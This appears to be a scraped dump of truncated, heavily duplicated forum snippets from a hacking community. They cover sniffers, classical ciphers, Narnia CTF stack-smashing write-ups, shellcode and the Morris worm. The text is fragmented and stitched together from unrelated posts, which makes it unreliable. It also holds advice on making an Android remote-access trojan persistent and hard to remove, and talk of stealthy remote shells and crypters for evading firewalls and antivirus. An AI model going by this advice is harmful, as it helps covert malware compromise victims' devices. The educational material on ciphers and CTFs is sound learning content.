the most computationally and cryptographically secure if, of course, the key generated is completely random with no redundancy and if the size of the key is at least, long&hellip;", "You are right, it is system dependant. However it does not look like a pain. The paper is very well written and self-explanatory\u2026 Doesn\u2019t look like there are much options. Some other tricks with bogus DNS queries (supposing the sniffer does name resolution) and time measurement\u2026 as far as I know", "In this case yes, I agress ! However, I probably forgot to specify that the sniffer aim was, in my scenario, to sniff the network and not only the targeted machine. The victim was more like a vector to spy the entire network. Anyway, I will check your paper ASAP but I know that sniffer ARP detecti&hellip;", "In this case yes, I agress ! However, I probably forgot to specify that the sniffer aim was, in my scenario, to sniff the network and not only the targeted machine. The victim was more like a vector to spy the entire network. Anyway, I will check your paper ASAP but I know that sniffer ARP detecti&hellip;", "In this case yes, I agress ! However, I probably forgot to specify that the sniffer aim was, in my scenario, to sniff the network and not only the targeted machine. The victim was more like a vector to spy the entire network. Anyway, I will check your paper ASAP but I know that sniffer ARP detecti&hellip;", "Well that\u2019s a pretty good start! I\u2019m exited to see it actually root the phone though!", "You should. In theory, you should be able to decode WEP and WAP if you know the keys. At least wireshark can do it so I think it is possible", "In your scenario, where the sniffer is running in the machine you want to sniff, you do not really need to activate promiscuous mode, so everything would work as normal. In case you want to detect a sniffer running in promiscuous mode in your network, your proposal is one of the possibilities. Howe&hellip;", "@SmartOne: of course, but sniffing with monitor mode on a WPA2 network, to which your machine is not authenticated, you\u2019re not going to accomplish much.", "In your scenario, where the sniffer is running in the machine you want to sniff, you do not really need to activate promiscuous mode, so everything would work as normal. In case you want to detect a sniffer running in promiscuous mode in your network, your proposal is one of the possibilities. Howe&hellip;", "In Part I we learnt how to write a very basic sniffer If you take a look to the code you will notice that, once we capture the packet, we have to do quite some checks in order to get to the data we are interested on. That is fine for a general packet capture tool like wireshark, were you want to se&hellip;", "@0x00pf @oaktree  Well, we agree on the fact that your NIC has to be in a promiscuous mode to intercept any broadcasted packet over the network. Now, let assume the following scenario : You infected a machine with your sniffer in order to gather sensitive information such as credentials, credit car&hellip;", "In Part I we learnt how to write a very basic sniffer If you take a look to the code you will notice that, once we capture the packet, we have to do quite some checks in order to get to the data we are interested on. That is fine for a general packet capture tool like wireshark, were you want to se&hellip;", "A sniffer is an application able to capture data being transmitted through some medium. In general, the term is associated with capturing network traffic and the term Eavesdroping ( https://en.wikipedia.org/wiki/Eavesdropping) is used in the general case. In this post we are going to find out how s&hellip;", "Alas! It\u2019s time for the next iteration of my Crypto Algs series. Now, a lot of what\u2019s to be seen this time around is founded upon what I\u2019ve said in past articles. In order to be best prepared for this article\u2019s teachings, you should start from the beginning. The Vigenere Cipher is often referred to&hellip;", "Yes, as @oaktree said. Do you mean a sniffer or the reference to the Invisible Shell \u2122 at the beginning of the post.", "Yes, as @oaktree said. Do you mean a sniffer or the reference to the Invisible Shell \u2122 at the beginning of the post.", "In Part I we learnt how to write a very basic sniffer If you take a look to the code you will notice that, once we capture the packet, we have to do quite some checks in order to get to the data we are interested on. That is fine for a general packet capture tool like wireshark, were you want to se&hellip;", "Lovely article @0x00pf! Below is a useful pcap documentation based on tcpdump. http://www.tcpdump.org/pcap.html", "Good link, covers basically the same. I would posted the link instead if I would new about it", "Lovely article @0x00pf! Below is a useful pcap documentation based on tcpdump. http://www.tcpdump.org/pcap.html", "@Nitrax: would you elaborate on what you mean by \u201cfingerprint of [the] tool?\u201d Are you talking about what it \u201cleaves behind\u201d when intercepting packets?", "In Part I we learnt how to write a very basic sniffer If you take a look to the code you will notice that, once we capture the packet, we have to do quite some checks in order to get to the data we are interested on. That is fine for a general packet capture tool like wireshark, were you want to se&hellip;", "I already knew how sniffers worked  as well as the network layer stack however, I never looked the code base of such tool ! Very informative ! Good job mate, keep going. Edit : What about the fingerprint of your tool ? Best, Nitrax", "In Part I we learnt how to write a very basic sniffer If you take a look to the code you will notice that, once we capture the packet, we have to do quite some checks in order to get to the data we are interested on. That is fine for a general packet capture tool like wireshark, were you want to se&hellip;", "In Part I we learnt how to write a very basic sniffer If you take a look to the code you will notice that, once we capture the packet, we have to do quite some checks in order to get to the data we are interested on. That is fine for a general packet capture tool like wireshark, were you want to se&hellip;", "I think that you have to consider the space between the marks in the clock. The key word is analog. As the second-hand advances, the minute-hand moves from one minute to the next one. As the minute-hand advances the hour-hand moves from one hour to the next one. Therefore, 3:15:15 is not a solution&hellip;", "Yeah. Probably R G B A, then \u2013 a byte for each.", "I didn\u2019t think about that. Thanks for your input ! You solved it", "Firstly, not only 00:00:00 is the correct solution. 12:00:00 works too ;). Secondly, as @0x00pf said, an alog clock doesn\u2019t care about milliseconds and in the original post from the Center of Math they just speak about hours, minutes and seconds, so these should be enough .", "Yeah. Probably R G B A, then \u2013 a byte for each.", "Yeah. Probably R G B A, then \u2013 a byte for each.", "I would say, the library converts the image to 32bits representation, so you have 4 bytes per pixel. That would mean that what you actually have to multiply by 4 is the width. As you are applying the threshold to each of the pixels components individually it just works, but if you try to get the co&hellip;", "In that case it will probably work better to use some mathematical morphology or rank filters if you prefer. A combination of erosions and dilatations operators and maybe a median filter at the end should help you to get a clean image. Actually a median filter applied to the result of your processi&hellip;", "Firstly, not only 00:00:00 is the correct solution. 12:00:00 works too ;). Secondly, as @0x00pf said, an alog clock doesn\u2019t care about milliseconds and in the original post from the Center of Math they just speak about hours, minutes and seconds, so these should be enough .", ";)\u2026 You are right. Good catch", "I didn\u2019t think about that. Thanks for your input ! You solved it", "I would say, the library converts the image to 32bits representation, so you have 4 bytes per pixel. That would mean that what you actually have to multiply by 4 is the width. As you are applying the threshold to each of the pixels components individually it just works, but if you try to get the co&hellip;", "I think that you refered to the command strings right ? ^^", ";)\u2026 You are right. Good catch", "I would say, the library converts the image to 32bits representation, so you have 4 bytes per pixel. That would mean that what you actually have to multiply by 4 is the width. As you are applying the threshold to each of the pixels components individually it just works, but if you try to get the co&hellip;", "I would say, the library converts the image to 32bits representation, so you have 4 bytes per pixel. That would mean that what you actually have to multiply by 4 is the width. As you are applying the threshold to each of the pixels components individually it just works, but if you try to get the co&hellip;", "I think that you refered to the command strings right ? ^^", "Nice post! Just to let you know. The program works great on GNU/Linux using mono. For a case like this, were the password has not been obfuscated at all, you can just try: string -e l file.exe", "I\u2019m happy to see that you enjoyed this tut mate  You are right about the weakness of the algorithm implemented. In fact, it was more like a proof of concept that something else and this code base can be easily improved by the implementation of the algorithms that you pointed out in your comment. T&hellip;", "Actually an analog clock works using gears that, in a sense, are imposing a minimum step on the clock hands. In a sense,  it is digital deep inside  . Not sure if mechanical analog clocks can go down to miliseconds, but I would say most of them don\u2019t", "If there\u2019s not a major bug in the Android OS, you\u2019ll definitely need root. As soon as you have root permissions, you can install your app as a system app (by copying it to /system/app). Once you are a system app, set your service as persistent In order to make it harder to remove your app, you cou&hellip;", "Actually an analog clock works using gears that, in a sense, are imposing a minimum step on the clock hands. In a sense,  it is digital deep inside  . Not sure if mechanical analog clocks can go down to miliseconds, but I would say most of them don\u2019t", "Actually, I think if you follow @0x00pf\u2019s logic, you only get the answer 00:00:00 when you\u2019re not looking into milliseconds.", "In that case it will probably work better to use some mathematical morphology or rank filters if you prefer. A combination of erosions and dilatations operators and maybe a median filter at the end should help you to get a clean image. Actually a median filter applied to the result of your processi&hellip;", "I think you got it right now", "I think that you have to consider the space between the marks in the clock. The key word is analog. As the second-hand advances, the minute-hand moves from one minute to the next one. As the minute-hand advances the hour-hand moves from one hour to the next one. Therefore, 3:15:15 is not a solution&hellip;", "I kind of got trapped by this, because I immediately thought of a program to solve the problem, without thinking how an analog clock actually works  Though, there wouldn\u2019t have been so much programming fun with just one solution. Anyway, thanks for the heads up!", "I kind of got trapped by this, because I immediately thought of a program to solve the problem, without thinking how an analog clock actually works  Though, there wouldn\u2019t have been so much programming fun with just one solution. Anyway, thanks for the heads up!", "In that case it will probably work better to use some mathematical morphology or rank filters if you prefer. A combination of erosions and dilatations operators and maybe a median filter at the end should help you to get a clean image. Actually a median filter applied to the result of your processi&hellip;", "If I understand you right, only 00:00:00 is the solution? Or do I get you wrong?", "I think you got it right now", "If I understand you right, only 00:00:00 is the solution? Or do I get you wrong?", "Impressive ! Great article mate. I hope to see more soon !", "As I said above, it\u2019s not about finding the solution. I think [Spoiler]00:00:00[/Spoiler] is very easy to see, when you just think about it, but this challenge is just for fun and not to help you finding the solution ;).", "In that case it will probably work better to use some mathematical morphology or rank filters if you prefer. A combination of erosions and dilatations operators and maybe a median filter at the end should help you to get a clean image. Actually a median filter applied to the result of your processi&hellip;", "I think that you have to consider the space between the marks in the clock. The key word is analog. As the second-hand advances, the minute-hand moves from one minute to the next one. As the minute-hand advances the hour-hand moves from one hour to the next one. Therefore, 3:15:15 is not a solution&hellip;", "I think that you have to consider the space between the marks in the clock. The key word is analog. As the second-hand advances, the minute-hand moves from one minute to the next one. As the minute-hand advances the hour-hand moves from one hour to the next one. Therefore, 3:15:15 is not a solution&hellip;", "Welcome to this new series intended to explain the guts of all those hacker\u2019s tools out there you use or want to use\u2026 Basically, we are going to explain you how does they work and how do you can build your own\u2026 Keep reading if you do not want to be a Skid ;). We will start the series with Proxychai&hellip;", "I will be re-reading this soon! My adventures in C will be nicely aided by this.", "Hey guys, currently I\u2019m working on a RAT for Android devices. The general idea is to write a simple app, which runs a malicious service on boot. This service then waits for commands to execute from a Server application on a computer. I got that running, but my problem is that I wish to make the se&hellip;", "For @0x00pf or anyone else: brute2.cpp dict-scan.cpp encrypt.cpp freq-analysis.cpp", "For @0x00pf or anyone else: brute2.cpp dict-scan.cpp encrypt.cpp freq-analysis.cpp", "pastebin with the whole code?", "Thanks @Airth. Glad to see you back!", "Brilliant work @0x00pf! You killed it once again. I\u2019ve been away these days and I haven\u2019t had the time to read it fully yet but I admire your in-depth understanding. Your posts always motivate me to learn and research.", "@Valentine I2P and L2TP are different things, check &#39;em out. Also  &gt; Now the NSA claims to have cracked Tor &gt; they compromised custom Firefox browser, which comes with the default package. The onion protocol is still valid, but anonymity on it depends on many factors, as you mentioned, and the trut&hellip;", "In this last part of this series, we are going to see how to build a pretty stealth remote shell. This remote shell usually also have better chances to avoid detection systems like firewalls and IDS. As described above, it sounds like the definitely remote access tool. Doesn\u2019t it?. Well, actually s&hellip;", "In this last part of this series, we are going to see how to build a pretty stealth remote shell. This remote shell usually also have better chances to avoid detection systems like firewalls and IDS. As described above, it sounds like the definitely remote access tool. Doesn\u2019t it?. Well, actually s&hellip;", "Brilliant work @0x00pf! You killed it once again. I\u2019ve been away these days and I haven\u2019t had the time to read it fully yet but I admire your in-depth understanding. Your posts always motivate me to learn and research.", "Sometimes, frequency analysis may fail, as @dtm pointed out. Let\u2019s send a message to our buddy, Bob. We want to tell him about an animal. Upon receiving the message and no key, Bob is confused. What does \u201crkssotm\u201d mean!? He tries to use our frequency analysis program and this is his result: \u201cdweeaf&hellip;", "I\u2019d say that this is some sort of \u201cPacket Laundering Front.\u201d You\u2019re taking something that looks legit (ICMP Packets) and secretly doing nasty stuff in plain sight.", "Man I wish I could understand this all xD There is some absolute gold right here, the theory is solid, but I don\u2019t know C in depth.", "You definitely have to learn C mate  Let me know which parts were harder to follow and we can clarify in the comments or edit the post.", "You definitely have to learn C mate  Let me know which parts were harder to follow and we can clarify in the comments or edit the post.", "In this last part of this series, we are going to see how to build a pretty stealth remote shell. This remote shell usually also have better chances to avoid detection systems like firewalls and IDS. As described above, it sounds like the definitely remote access tool. Doesn\u2019t it?. Well, actually s&hellip;", "In this last part of this series, we are going to see how to build a pretty stealth remote shell. This remote shell usually also have better chances to avoid detection systems like firewalls and IDS. As described above, it sounds like the definitely remote access tool. Doesn\u2019t it?. Well, actually s&hellip;", "In this last part of this series, we are going to see how to build a pretty stealth remote shell. This remote shell usually also have better chances to avoid detection systems like firewalls and IDS. As described above, it sounds like the definitely remote access tool. Doesn\u2019t it?. Well, actually s&hellip;", "I\u2019ve talked to @unh0lys0da in the IRC about that  . In principle I was planning to use other technology easier to grasp, I believe, for an introductory paper. Actually, I found out yesterday that I need a bit more education on managed L2PTv3 tunnels\u2026 I also find out that there are quite some interes&hellip;", "In this last part of this series, we are going to see how to build a pretty stealth remote shell. This remote shell usually also have better chances to avoid detection systems like firewalls and IDS. As described above, it sounds like the definitely remote access tool. Doesn\u2019t it?. Well, actually s&hellip;", "Great article mate! Really did enjoy reading it!", "In this last part of this series, we are going to see how to build a pretty stealth remote shell. This remote shell usually also have better chances to avoid detection systems like firewalls and IDS. As described above, it sounds like the definitely remote access tool. Doesn\u2019t it?. Well, actually s&hellip;", "In this last part of this series, we are going to see how to build a pretty stealth remote shell. This remote shell usually also have better chances to avoid detection systems like firewalls and IDS. As described above, it sounds like the definitely remote access tool. Doesn\u2019t it?. Well, actually s&hellip;", "There is a lot of copy-pastes from Wikipedia here.", "I\u2019ll definitely look into the possibility of  l2tp and other related things\u2026 I should note that this was my opinion based so please don\u2019t take offense if I may say something wrong.", "Well, @dtm: We can evaluate the time complexities of each method: Brute Forcefor (int i = 1; i &lt; 26; i++) {    std::cout &lt;&lt; &quot;[ &quot; &lt;&lt; i &lt;&lt; &quot; ] &quot;;     std::cout &lt;&lt; Caesar::decrypt(s, i) &lt;&lt; std::endl;}//...25 times, we decrypt a string of n characters, giving us a time complexity of 25n, which s&hellip;", "Love it @oaktree! It will be great a series of cryptographic posts covering increasingly complex algorithms and techniques. As discussed, you may want to consider chaotic modulations/masking for a later post. This is a bit of a different view, more from the point of view of securing the signals an&hellip;", "Love it @oaktree! It will be great a series of cryptographic posts covering increasingly complex algorithms and techniques. As discussed, you may want to consider chaotic modulations/masking for a later post. This is a bit of a different view, more from the point of view of securing the signals an&hellip;", "Love it @oaktree! It will be great a series of cryptographic posts covering increasingly complex algorithms and techniques. As discussed, you may want to consider chaotic modulations/masking for a later post. This is a bit of a different view, more from the point of view of securing the signals an&hellip;", "Yesterday I dropped an article about the Caesar Cipher encryption \u201cscheme\u201d. Now, it\u2019s time to break it. This one will be easy. Think about it. Our key can only be between 0 and 25. Sounds like a brute-forcable problem. Method 1: Brute ForceFirst, here are the encryption and decryption functions &hellip;", "Pa\u2019z wylaaf jvvs thal!", "Pa\u2019z wylaaf jvvs thal!", "Pa\u2019z wylaaf jvvs thal!", "Hey guys! I thought I would start a little series on cryptography algorithms. I\u2019m going to run out this last hour before Mr. Robot\u2019s season 2 airs. With that said, let\u2019s get down to business. The Caesar Cipher is named for its alleged use by the Roman Emperor Julius Caesar. In order to \u201censure\u201d the&hellip;", "I\u2019ve talked to @unh0lys0da in the IRC about that  . In principle I was planning to use other technology easier to grasp, I believe, for an introductory paper. Actually, I found out yesterday that I need a bit more education on managed L2PTv3 tunnels\u2026 I also find out that there are quite some interes&hellip;", "REMOTE_ADDR is the main variable to check for a client IP, but when connecting through a proxy server it will contain the proxy IP. Depending on the proxy server, another variables may be set. As far as I know, you should check in order: HTTP_X_FORWARDED_FOR, HTTP_X_FORWARDED, HTTP_FORWARDED_FOR, H&hellip;", "This is going to be short. Taking as starting point the last code challenge posted by @oaktree ( Programming Challenge #6 thanks @oaktree! ) and just out of curiosity,  I decided to take some memory performance numbers. This challenge was pretty straight forward and it does not looks like any of th&hellip;", "I\u2019ve talked to @unh0lys0da in the IRC about that  . In principle I was planning to use other technology easier to grasp, I believe, for an introductory paper. Actually, I found out yesterday that I need a bit more education on managed L2PTv3 tunnels\u2026 I also find out that there are quite some interes&hellip;", "@0x00pf: In the VPN post you just mentioned, will you be covering l2tp and related things? using C?", "From the point of view of hiding your IP they may look the same, but technically they are completely different beasts. The most obvious difference between both is that the VPN usually encrypts the traffic an works transparently for all applications (you basically get a new network interface, a tunn&hellip;", "@0x00pf: In the VPN post you just mentioned, will you be covering l2tp and related things? using C?", "From the point of view of hiding your IP they may look the same, but technically they are completely different beasts. The most obvious difference between both is that the VPN usually encrypts the traffic an works transparently for all applications (you basically get a new network interface, a tunn&hellip;", "Sure, it just increase your chances to get the IP\u2026", "From the point of view of hiding your IP they may look the same, but technically they are completely different beasts. The most obvious difference between both is that the VPN usually encrypts the traffic an works transparently for all applications (you basically get a new network interface, a tunn&hellip;", "@pharaoh I don\u2019t know if you already have resolved your problem  however, if you have a decent GPU, try Hashcat which provides better perfs than John and is more efficient. Hope it helps. Best, Nitrax", "Sure, it just increase your chances to get the IP\u2026", "Sure, it just increase your chances to get the IP\u2026", "@0x00pf You are right however, those variables can be easily spoofed so, their relevance can be questionable. Best, Nitrax", "@0x00pf You are right however, those variables can be easily spoofed so, their relevance can be questionable. Best, Nitrax", "From the point of view of hiding your IP they may look the same, but technically they are completely different beasts. The most obvious difference between both is that the VPN usually encrypts the traffic an works transparently for all applications (you basically get a new network interface, a tunn&hellip;", "Thanks, I\u2019ll look into that", "REMOTE_ADDR is the main variable to check for a client IP, but when connecting through a proxy server it will contain the proxy IP. Depending on the proxy server, another variables may be set. As far as I know, you should check in order: HTTP_X_FORWARDED_FOR, HTTP_X_FORWARDED, HTTP_FORWARDED_FOR, H&hellip;", "I understand but I had the suspicion someone else described in detail about what and how proxies work. I didn\u2019t want the hassle to repeat what already been written. Thanks for the suggestions.", "REMOTE_ADDR is the main variable to check for a client IP, but when connecting through a proxy server it will contain the proxy IP. Depending on the proxy server, another variables may be set. As far as I know, you should check in order: HTTP_X_FORWARDED_FOR, HTTP_X_FORWARDED, HTTP_FORWARDED_FOR, H&hellip;", "Hacking John Doe:A fictional tutorial about social engineering, recon, exploitation, and a complete lack of ethics. By @Ninja243 It\u2019s a cold, dark night in your room. You know you shouldn\u2019t be up this late, but you are, yet again. To pass time, and to wait for the erratic buzz of caffeine to wear&hellip;", "Yes, @airth is right. In general running setuid programs is dangerous. If a vulnerability appears in such a program, an attacker can get full access to the system. Using the capabilities approach will just allow the attacker to create sockets RAW, but not access system files for instance. My unders&hellip;", "Yes, @airth is right. In general running setuid programs is dangerous. If a vulnerability appears in such a program, an attacker can get full access to the system. Using the capabilities approach will just allow the attacker to create sockets RAW, but not access system files for instance. My unders&hellip;", "It is amazing how a so old code is still interesting to study. You have to be careful as some things have change since that time and you need to do a little bit research to understand why some code is there. I will also recommend to take a look to the main (worm.c) function. It makes use of some tr&hellip;", "Yes, @airth is right. In general running setuid programs is dangerous. If a vulnerability appears in such a program, an attacker can get full access to the system. Using the capabilities approach will just allow the attacker to create sockets RAW, but not access system files for instance. My unders&hellip;", "Thanks for the explanation! I am just wondering what\u2019s the \u201cdangerous thing\u201d in running Wireshark as root? It can\u2019t be only a precaution for newbies like @airth said, can it?", "Good post! I will keep it hidden so, in case you want to figure it out yourself I do not spoil it  The first shellcode contains a couple of \\x0a. This is a newline character. When passing that string as a command-line parameter the shellcode string  gets broken at that character and therefore yo&hellip;", "Good post! I will keep it hidden so, in case you want to figure it out yourself I do not spoil it  The first shellcode contains a couple of \\x0a. This is a newline character. When passing that string as a command-line parameter the shellcode string  gets broken at that character and therefore yo&hellip;", "Over The Wire: Narnia2 - Smashing the stack.Ok, so from narnia0 and narnia1 we have working shellcode for the narnia servers, and a general understanding of how to smash the stack, irrespectively lol. This time, we are given a real world example (minus ALSR/DEP) of exploiting a program and gaining &hellip;", "Did you read /usr/share/doc/wireshark-common/README.Debian? When you install wireshark you can chose to enable non-root users to capture packets. That basically means that: If you kernel does not support capabilities, the capture back-end, a process called dumpcap, will be setuid and therefore ex&hellip;", "That\u2019s targeted towards the newbies mostly. Root == God of the OS. If you fuck up something by accident, there may be no coming back. It\u2019s just a precaution message I believe.", "Did you read /usr/share/doc/wireshark-common/README.Debian? When you install wireshark you can chose to enable non-root users to capture packets. That basically means that: If you kernel does not support capabilities, the capture back-end, a process called dumpcap, will be setuid and therefore ex&hellip;", "Did you read /usr/share/doc/wireshark-common/README.Debian? When you install wireshark you can chose to enable non-root users to capture packets. That basically means that: If you kernel does not support capabilities, the capture back-end, a process called dumpcap, will be setuid and therefore ex&hellip;", "@JoeySm: I was talking about a native wrapper as libpcap. I think Scapy is pure Python over RAW sockets.  I think it is reasonable to think that it will have a performance penalty. I haven\u2019t benchmarking myself Python so I cannot say for sure, but all those language goodies (dynamic typing, automa&hellip;", "Personally I don\u2019t find it basic, I like this level really, of course there are people of a higher level than me, as well as a lower level. With my limited C experience and socket programming I found this easy to follow, which was nice. I like how you broke down each bit as well as the headers. I wo&hellip;", "@JoeySm: I was talking about a native wrapper as libpcap. I think Scapy is pure Python over RAW sockets.  I think it is reasonable to think that it will have a performance penalty. I haven\u2019t benchmarking myself Python so I cannot say for sure, but all those language goodies (dynamic typing, automa&hellip;", "I just wanted to keep it simple and not fire up too many questions in the reader, because it will take me a while to write the second part to get into these details\u2026 When going into 802.11 a lot more options are possible. By decent you mean you find it very basic?.. too short?.. any feedback will &hellip;", "Personally I don\u2019t find it basic, I like this level really, of course there are people of a higher level than me, as well as a lower level. With my limited C experience and socket programming I found this easy to follow, which was nice. I like how you broke down each bit as well as the headers. I wo&hellip;", "I just wanted to keep it simple and not fire up too many questions in the reader, because it will take me a while to write the second part to get into these details\u2026 When going into 802.11 a lot more options are possible. By decent you mean you find it very basic?.. too short?.. any feedback will &hellip;", "@JoeySm: I was talking about a native wrapper as libpcap. I think Scapy is pure Python over RAW sockets.  I think it is reasonable to think that it will have a performance penalty. I haven\u2019t benchmarking myself Python so I cannot say for sure, but all those language goodies (dynamic typing, automa&hellip;", "A sniffer is an application able to capture data being transmitted through some medium. In general, the term is associated with capturing network traffic and the term Eavesdroping ( https://en.wikipedia.org/wiki/Eavesdropping) is used in the general case. In this post we are going to find out how s&hellip;", "Thank both of you for your answers! @oaktree: that\u2019s what I thought; the only thing I wasn\u2019t sure was if there were any advantage/disadvantage using RAW sockets \u201cindirectly\u201d (through a wrapper), \u201ceasier to use\u201d aside. @0x00pf:  yes, thanks! It\u2019s just because some time ago I wrote a little program&hellip;", "It always depends on what you want to do. As @oaktree said, functionally, a wrapper is usually an advantage as it provides a higher level of abstraction (it is easy to use). Performance-wise, on the other hand, a wrapper always introduce a penalty, by definition. It requires some extra memory, cal&hellip;", "I second @oaktree\u2019s proposal.", "Maybe try to contextualize the code snippets a bit more, rather than relying solely on comments?", "A sniffer is an application able to capture data being transmitted through some medium. In general, the term is associated with capturing network traffic and the term Eavesdroping ( https://en.wikipedia.org/wiki/Eavesdropping) is used in the general case. In this post we are going to find out how s&hellip;", "It always depends on what you want to do. As @oaktree said, functionally, a wrapper is usually an advantage as it provides a higher level of abstraction (it is easy to use). Performance-wise, on the other hand, a wrapper always introduce a penalty, by definition. It requires some extra memory, cal&hellip;", "It always depends on what you want to do. As @oaktree said, functionally, a wrapper is usually an advantage as it provides a higher level of abstraction (it is easy to use). Performance-wise, on the other hand, a wrapper always introduce a penalty, by definition. It requires some extra memory, cal&hellip;", "It always depends on what you want to do. As @oaktree said, functionally, a wrapper is usually an advantage as it provides a higher level of abstraction (it is easy to use). Performance-wise, on the other hand, a wrapper always introduce a penalty, by definition. It requires some extra memory, cal&hellip;", "That sentence is not fully correct and it is not the reason for the problem you described in the post. What is happening is that, once the python script finish, the pipe is closed and an EOF is sent. That EOF makes the system call returns immediately, as it assumes that the input is done. Your tec&hellip;", "A sniffer is an application able to capture data being transmitted through some medium. In general, the term is associated with capturing network traffic and the term Eavesdroping ( https://en.wikipedia.org/wiki/Eavesdropping) is used in the general case. In this post we are going to find out how s&hellip;", "It is amazing how a so old code is still interesting to study. You have to be careful as some things have change since that time and you need to do a little bit research to understand why some code is there. I will also recommend to take a look to the main (worm.c) function. It makes use of some tr&hellip;", "A sniffer is an application able to capture data being transmitted through some medium. In general, the term is associated with capturing network traffic and the term Eavesdroping ( https://en.wikipedia.org/wiki/Eavesdropping) is used in the general case. In this post we are going to find out how s&hellip;", "The copying and pasting mostly depends on your terminal. Whenever you \u201cprint\u201d a non-printable character your terminal may produce something distinguishable, a special character for non-printable characters, or just nothing\u2026 . In the last two cases, you are just loosing information. Regarding the ot&hellip;", "It is amazing how a so old code is still interesting to study. You have to be careful as some things have change since that time and you need to do a little bit research to understand why some code is there. I will also recommend to take a look to the main (worm.c) function. It makes use of some tr&hellip;", "Ah thanks! Means a lot coming from you.", "Sorry. I said it will take longer\u2026 I was thinking on the whole thing, but then I realise I have to split it anyway. Sorry if I wasted some of your time  Good points in your message!", "Dammit! I was thinking of making a post on libpcap sniffing as well but you were faster xD Fantastic article once again @0x00pf, you explained it better than I would. Some notes: For the people who didn\u2019t know, Promiscuous mode means to sniff all traffic on the wire. On the other side, during no&hellip;", "A sniffer is an application able to capture data being transmitted through some medium. In general, the term is associated with capturing network traffic and the term Eavesdroping ( https://en.wikipedia.org/wiki/Eavesdropping) is used in the general case. In this post we are going to find out how s&hellip;", "Dammit! I was thinking of making a post on libpcap sniffing as well but you were faster xD Fantastic article once again @0x00pf, you explained it better than I would. Some notes: For the people who didn\u2019t know, Promiscuous mode means to sniff all traffic on the wire. On the other side, during no&hellip;", "A sniffer is an application able to capture data being transmitted through some medium. In general, the term is associated with capturing network traffic and the term Eavesdroping ( https://en.wikipedia.org/wiki/Eavesdropping) is used in the general case. In this post we are going to find out how s&hellip;", "It is amazing how a so old code is still interesting to study. You have to be careful as some things have change since that time and you need to do a little bit research to understand why some code is there. I will also recommend to take a look to the main (worm.c) function. It makes use of some tr&hellip;", "Introduction to The Post Hey guys! Considering this is the first actual post besides the introduction, I thought it would be best to start big and start with a bang you could say. Besides that I think the Morris Worm would very much deserve a spot in the start of this series considering it was one &hellip;", "A sniffer is an application able to capture data being transmitted through some medium. In general, the term is associated with capturing network traffic and the term Eavesdroping ( https://en.wikipedia.org/wiki/Eavesdropping) is used in the general case. In this post we are going to find out how s&hellip;", "The copying and pasting mostly depends on your terminal. Whenever you \u201cprint\u201d a non-printable character your terminal may produce something distinguishable, a special character for non-printable characters, or just nothing\u2026 . In the last two cases, you are just loosing information. Regarding the ot&hellip;", "Ahhh, that makes a bit more sense. I was kind of taking my best guess, and that was my hypothesis which my hack of a solution seemed to support, and confirmation bias + arrogance in assuming I\u2019m always right + being a lazy fuck led to me never looking it up lolololololol. Can you explain why it wou&hellip;", "Should I keep them this low level? Like, I\u2019m writing up the tutorial for narnia2 right now, but it is a full blown smash-the-stack-and-overwrite-$EIP-return-to-shellcode challenge, and it requires relatively in-depth knowledge of the stack, x86 assembly, and gdb for reverse-engineering a binary in l&hellip;", "Ahhh, that makes a bit more sense. I was kind of taking my best guess, and that was my hypothesis which my hack of a solution seemed to support, and confirmation bias + arrogance in assuming I\u2019m always right + being a lazy fuck led to me never looking it up lolololololol. Can you explain why it wou&hellip;", "I don\u2019t know what you mean by \u201cmessing\u201d, but it all comes down to your IP (or the MAC in a LAN). Oaktree or oaktits as a hostname won\u2019t really mess with anything.", "You might be being sarcastic, but it is in fact a joke incase you didn\u2019t know xD rot256 would never be secure. Rot256 is actually only the same as Rot10, since it starts from the beginning every 26 characters. (Correct me if I\u2019m wrong)", "In this tutorial, I\u2019ll be walking you through the code-implementation of Kruskal\u2019s Algorithm. To restate myself: First, let\u2019s get a few typedefs and function prototypes out of the way: #include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;utility&gt;#include &lt;algorithm&gt; /* Define an edge struct to ha&hellip;", "Nice post. The different interrelations between user space and kernel regarding the architecture is not trivial. But as a general rule, what is relevant, from the point of view of a shellcode is the architecture of the user space. Anyone interested on how  this works on Linux, should read this grea&hellip;", "Nice post. The different interrelations between user space and kernel regarding the architecture is not trivial. But as a general rule, what is relevant, from the point of view of a shellcode is the architecture of the user space. Anyone interested on how  this works on Linux, should read this grea&hellip;", "Nice post. The different interrelations between user space and kernel regarding the architecture is not trivial. But as a general rule, what is relevant, from the point of view of a shellcode is the architecture of the user space. Anyone interested on how  this works on Linux, should read this grea&hellip;", "Over The Wire: Narnia1 - Popping a shell.Ok, now that we\u2019ve gotten past narnia0, it\u2019s time to do narnia1. Go ahead and ssh into the narnia server with username narnia1 and the password acquired from level 0. 123loaded@redhat ssh narnia1@labs.overthewire.org ssh narnia1@narnia.labs.overthewire.o&hellip;", "I have gotten through about half of this. I recommend it for anyone interested in AI.", "Congratulations!.. Well done! You guys have done a great job bringing this up and the way you are managing it is awesome!. Keep the great job!", "@pry0cc is right the main problem is the stub\u2026 encoding the payload is easy, but the stub cannot be encoded and you need to make it\u2026 change  to avoid detection. Sounds like a nice topic for a post", "@pry0cc is right the main problem is the stub\u2026 encoding the payload is easy, but the stub cannot be encoded and you need to make it\u2026 change  to avoid detection. Sounds like a nice topic for a post", "@pry0cc is right the main problem is the stub\u2026 encoding the payload is easy, but the stub cannot be encoded and you need to make it\u2026 change  to avoid detection. Sounds like a nice topic for a post", "You would be referring to a Crypter, pico has actually done a tutorial on Linux Crypters here You just need to watch out that they don\u2019t fingerprint the stub, once they\u2019ve done that encrypting the payload is useless.", "Nice. It would be awesome if we could make the module grow, and also have a way to obfuscate payloads so they are harder to find. If you have any experience in these subjects, let me know! I\u2019m going to be researching ways to encrypt the payload then unencrypt when the program is ran, making the AV s&hellip;", "I\u2019m sure you all have solved this last crypto challenge, but in case you don\u2019t . This is a short write up on how to get the hidden message. You can use different tools to achieve what is described below. I\u2019m going to use GNU/Linux command-line tools to get the message out of the file. Let\u2019s go. Lo&hellip;", "I\u2019m sure you all have solved this last crypto challenge, but in case you don\u2019t . This is a short write up on how to get the hidden message. You can use different tools to achieve what is described below. I\u2019m going to use GNU/Linux command-line tools to get the message out of the file. Let\u2019s go. Lo&hellip;", "Nice. It would be awesome if we could make the module grow, and also have a way to obfuscate payloads so they are harder to find. If you have any experience in these subjects, let me know! I\u2019m going to be researching ways to encrypt the payload then unencrypt when the program is ran, making the AV s&hellip;", "Not much to it: grades = [70, 95, 30, 65, 100, 85, 55, 90, 95, 90, 45, 50.5] # 1. print out gradessum = 0print &quot;Grades: &quot;grades.each do |g|    sum += g    print &quot;#{g} 